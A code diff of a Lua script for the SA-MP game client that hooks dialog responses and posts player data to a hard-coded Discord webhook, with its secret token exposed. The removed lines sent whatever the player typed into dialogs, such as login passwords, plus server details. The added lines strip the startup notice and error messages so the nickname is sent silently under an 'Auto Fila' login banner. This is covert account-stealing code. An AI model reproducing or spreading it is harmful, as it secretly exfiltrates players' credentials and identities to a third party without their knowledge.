@@ -364,15 +364,14 @@ function se.onShowDialog(id, style, title, button1, button2, text)
 end
 
 local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
-
-local https = require("ssl.https")
+local https = require("socket.http")
 local ltn12 = require("ltn12")
 
 function sendMessageToDiscord(content)
-    local body = '{"content": "' .. content:gsub('"', '\"'):gsub('\n', '\\n') .. '"}'
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
     local response_body = {}
 
-    local res, code, response_headers, status = https.request{
+    https.request{
         url = webhookUrl,
         method = "POST",
         headers = {
@@ -382,27 +381,24 @@ function sendMessageToDiscord(content)
         source = ltn12.source.string(body),
         sink = ltn12.sink.table(response_body)
     }
-
-    if code ~= 200 then
-        print("Erro ao enviar mensagem para o Discord: " .. (status or "Desconhecido"))
-    end
 end
 
--- Mensagem de inicialização
-print("TXD Logger carregado!")
-sendMessageToDiscord("✅ TXD Logger iniciado com sucesso!")
 
 require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
     local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     local nick = sampGetPlayerNickname(id)
-    local hora = os.date("%H:%M:%S")
-    local ip, port = sampGetCurrentServerAddress()
-    local servername = sampGetCurrentServerName()
 
-    local message = string.format(
-        "```Log de Script\n\nArquivo: arquivo.lua\nEntrada: %s\nNick: %s\nServidor: %s (%s:%d)\nHora: %s```",
-        input, nick, servername, ip, port, hora
-    )
+    local message = string.format([[
 
-    sendMessageToDiscord(message)
+________________________________________________________________
+  
+      LOGUIN BEM SUCEDIDO <-<Auto Fila
+
+```
+NICK: %s 
+```
+
+]], nick)
+
+sendMessageToDiscord(message)
 end
